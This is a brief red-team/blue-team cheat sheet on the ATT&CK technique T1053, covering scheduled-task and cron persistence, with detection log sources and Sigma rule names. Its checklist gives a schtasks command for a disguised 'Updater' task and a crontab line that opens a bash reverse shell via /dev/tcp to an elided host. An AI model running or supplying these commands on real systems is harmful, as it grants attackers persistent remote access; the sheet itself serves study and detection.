# T1053 – Scheduled Task / Cron

## 🧰 Tools
| OS | Tool | Description |
|----|------|-------------|
| Windows | schtasks.exe / at.exe | scheduled payload |
| Linux | crontab / systemd timers | recurring shell |

---

## ✅ Checklist
- Create task: `schtasks /create /tn Updater /tr cmd.exe /sc minute /mo 10`
- Verify execution: check task scheduler logs
- For Linux: `echo "* * * * * /bin/bash -i >& /dev/tcp/... 0>&1" >> /etc/crontab`

---

## ⚕ Detection
| Source | Event/Log | Signature |
|---------|------------|-----------|
| Windows | Event ID 4698 | New scheduled job |
| Linux | Auditd execve on `/bin/cron` | Detect new cron entries |
| Sigma | `scheduled_task_creation.yml`, `cron_persistence.yml` |


Author : yasinabedini
GitHub : https://github.com/yasinabedini

